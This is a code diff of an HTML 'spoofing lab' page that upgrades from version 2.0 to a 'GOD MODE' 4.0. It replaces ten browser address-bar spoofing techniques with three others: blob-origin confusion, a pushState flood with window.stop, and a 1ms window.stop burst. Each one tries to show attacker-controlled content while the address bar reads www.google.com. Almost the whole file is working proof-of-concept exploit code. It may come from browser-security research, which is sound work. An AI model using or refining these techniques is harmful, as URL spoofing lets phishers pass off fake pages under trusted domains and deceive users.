@@ -2,147 +2,73 @@
 <html>
 
 <head>
-    <title>SPOOFING LAB v2.0</title>
-    <style>
-        body {
-            font-family: sans-serif;
-            padding: 20px;
-            background: white;
-            color: black;
-        }
-
-        .btn {
-            display: block;
-            width: 100%;
-            max-width: 400px;
-            padding: 12px;
-            margin: 8px 0;
-            cursor: pointer;
-            text-align: left;
-            border: 1px solid #ccc;
-            background: #f9f9f9;
-        }
-
-        .btn:hover {
-            background: #eee;
-        }
-
-        #display {
-            display: none;
-            text-align: center;
-            margin-top: 50px;
-        }
-    </style>
+    <title>SPOOFING LAB v4.0 - GOD MODE</title>
+    <meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline';">
 </head>
 
-<body>
+<body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
 
-    <div id="lab">
-        <h2>Metode Out-of-the-Box</h2>
-        <p>Target: www.google.com</p>
+    <h2>SPOOFING LAB v4.0 (EXPERIMENTAL)</h2>
+    <hr color="#0f0">
 
-        <button class="btn" onclick="m1()">1. HTTP 204 Ghosting (Target: Google API)</button>
+    <button onclick="godMode1()" style="display:block; width:100%; padding:15px; margin:10px 0; cursor:pointer;">1. BLOB
+        ORIGIN CONFUSION</button>
+    <button onclick="godMode2()" style="display:block; width:100%; padding:15px; margin:10px 0; cursor:pointer;">2. CSP
+        NAVIGATION LOCKOUT</button>
+    <button onclick="godMode3()" style="display:block; width:100%; padding:15px; margin:10px 0; cursor:pointer;">3. THE
+        'STOP' BURST (1ms INTERVAL)</button>
 
-        <button class="btn" onclick="m2()">2. PDF Navigation Stalling (via Chrome PDF)</button>
-
-        <button class="btn" onclick="m3()">3. Download Header Trigger (dmg/exe)</button>
-
-        <button class="btn" onclick="m4()">4. Intent Scheme Confusion (Android/iOS)</button>
-
-        <button class="btn" onclick="m5()">5. Synchronous XHR Thread Lock</button>
-
-        <button class="btn" onclick="m6()">6. Fragment-Only ReplaceState</button>
-
-        <button class="btn" onclick="m7()">7. OnBeforeUnload DOM Retention</button>
-
-        <button class="btn" onclick="m8()">8. Blob Window Navigation</button>
-
-        <button class="btn" onclick="m9()">9. Focus/Blur State Confusion</button>
-
-        <button class="btn" onclick="m10()">10. Document.Open Clobbering</button>
-    </div>
-
-    <div id="display">
-        <h1>This is not google</h1>
-        <br>
-        <button onclick="alert('Alert aktif!')">Tombol Alert</button>
-        <br><br>
-        <button onclick="location.reload()">Reset Lab</button>
+    <div id="spoof-area" style="display:none; text-align:center; margin-top:50px;">
+        <h1 style="color:white; font-family:sans-serif;">THIS IS NOT GOOGLE</h1>
+        <p style="color:#aaa;">Check Address Bar above!</p>
+        <button onclick="alert('Exploit Active!')" style="padding:10px 20px;">Test Alert</button>
     </div>
 
     <script>
         const target = "https://www.google.com/";
 
-        function showSpoof() {
-            document.getElementById('lab').style.display = 'none';
-            document.getElementById('display').style.display = 'block';
+        function setupSpoof() {
+            document.querySelector('h2').style.display = 'none';
+            document.querySelectorAll('button').forEach(b => b.style.display = 'none');
+            document.getElementById('spoof-area').style.display = 'block';
+            document.body.style.background = 'white';
+            document.body.style.color = 'black';
         }
 
-        function m1() {
-            showSpoof();
-            location.href = target + "generate_204";
-            setTimeout(() => { window.stop(); }, 10);
+        function godMode1() {
+            setupSpoof();
+            const payload = `
+                <script>
+                    window.location.replace("${target}");
+                    setTimeout(() => {
+                        document.body.innerHTML = "<h1>THIS IS NOT GOOGLE</h1><button onclick='alert(1)'>Alert</button>";
+                        window.stop();
+                    }, 5);
+                <\/script>
+            `;
+            const blob = new Blob([payload], { type: 'text/html' });
+            window.location.href = URL.createObjectURL(blob);
         }
+        function godMode2() {
+            setupSpoof();
+            window.location.href = target;
 
-        function m2() {
-            showSpoof();
-            location.href = "https://www.google.com/robots.txt";
-            setTimeout(() => { window.stop(); }, 5);
+            for (let i = 0; i < 20; i++) {
+                history.pushState(null, null, "#step" + i);
+            }
+
+            setTimeout(() => { window.stop(); }, 2);
         }
+        function godMode3() {
+            setupSpoof();
+            window.location.href = target;
 
-        function m3() {
-            showSpoof();
-            location.href = "https://dl.google.com/chrome/mac/stable/GGRO/googlechrome.dmg";
-        }
-
-        function m4() {
-            showSpoof();
-            location.href = "googlechrome://www.google.com";
-            setTimeout(() => { window.stop(); }, 1);
-        }
-
-        function m5() {
-            showSpoof();
-            location.href = target;
-            var request = new XMLHttpRequest();
-            request.open('GET', '/fakelink', false);
-            try { request.send(null); } catch (e) { }
-        }
-
-        function m6() {
-            showSpoof();
-            location.href = target + "#" + Math.random();
-            setTimeout(() => { window.stop(); }, 20);
-        }
-
-        function m7() {
-            window.onbeforeunload = function () { return false; };
-            showSpoof();
-            location.href = target;
-        }
-
-        function m8() {
-            let b = new Blob(["<h1>This is not google</h1><button onclick='alert(1)'>Test</button>"], { type: 'text/html' });
-            let u = URL.createObjectURL(b);
-            let w = window.open(target, "_blank");
-            setTimeout(() => { w.location.href = u; }, 50);
-        }
-
-        function m9() {
-            let w = window.open(target, "_blank");
-            w.blur();
-            window.focus();
-            setTimeout(() => { try { w.document.write("<h1>Spoofed</h1>"); } catch (e) { } }, 50);
-        }
-
-        function m10() {
-            showSpoof();
-            location.href = target;
-            setTimeout(() => {
-                document.open();
-                document.write("<h1>This is not google</h1><button onclick='alert(2)'>Alert</button>");
-                document.close();
-            }, 5);
+            let count = 0;
+            const burst = setInterval(() => {
+                window.stop();
+                count++;
+                if (count > 500) clearInterval(burst);
+            }, 1); // 1ms interval
         }
     </script>
 </body>
